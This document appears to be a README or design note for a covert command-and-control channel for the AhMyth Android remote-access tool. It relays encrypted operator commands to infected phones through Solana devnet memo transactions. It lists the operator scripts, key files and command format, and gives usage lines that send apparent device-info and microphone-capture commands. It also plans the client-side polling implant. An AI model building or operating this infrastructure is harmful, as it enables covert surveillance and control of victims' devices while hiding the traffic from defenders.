# Blockchain C2 - Solana Devnet (PYUSD-style) Memo Channel

## Overview

- Switched from Sepolia (EVM) events to Solana devnet memos.
- Commands are AES-256-GCM encrypted and embedded in memo instructions (`CMD:<hex>`).
- Operator and client communicate via a shared **channel address** (base58) on Solana devnet.
- PYUSD-style SPL mint is supported (devnet-only, created by `scripts/setup-solana-devnet.js`).

## Key Components

1. **AhMyth-Server/app/blockchain-operator.js**: sends encrypted commands via Solana memo.
2. **.blockchain-keys.env / .blockchain-contract.env**: Solana RPC, keys, channel, PYUSD mint info.
3. **wallet-check.js**: verifies SOL/PYUSD balances on devnet.
4. **scripts/setup-solana-devnet.js**: generates Solana keys, creates PYUSD-like mint (best effort airdrop), writes env files.
5. **Android client (pending)**: needs to poll memo instructions and send responses via memo transactions.

## Data Model

- **Channel address** (`SOLANA_CHANNEL_ADDRESS` / `BLOCKCHAIN_CONTRACT_ADDRESS`): account the client polls for new memos.
- **Operator key** (`BLOCKCHAIN_PRIVATE_KEY` base58): signs commands.
- **Client key** (`BLOCKCHAIN_CLIENT_PRIVATE_KEY` base58): will sign responses.
- **AES key** (`BLOCKCHAIN_C2_AES_KEY` hex): shared encryption key.
- **PYUSD mint** (`SOLANA_PYUSD_MINT`): optional devnet SPL mint created by setup script.

## Command Format

Encrypted JSON:
```json
{
  "action": "x0000di",
  "data": {},
  "timestamp": 1234567890
}
```
The encrypted bytes (`nonce + ciphertext + authTag`) are hex-encoded and prefixed with `CMD:` in the memo data.

## Usage

1) **Generate Solana config**
```bash
node scripts/setup-solana-devnet.js   # best effort airdrop + mint; writes .blockchain-*.env
```
If devnet airdrop throttles, fund the operator wallet manually and rerun (or fill `SOLANA_PYUSD_MINT` manually).

2) **Check balances**
```bash
node wallet-check.js
```

3) **Send a command**
```bash
node AhMyth-Server/app/blockchain-operator.js x0000di
node AhMyth-Server/app/blockchain-operator.js x0000mc "{\"sec\":5}"
```

4) **Test connectivity**
```bash
node test-blockchain-connection.js --send-test
```

## Notes / Next Steps

- Android-side Solana memo polling and response sender must replace the current EVM log-based implementation.
- Keep `.blockchain-keys.env` out of version control.
- Devnet fees are negligible; each command sends a 1-lamport transfer plus memo.









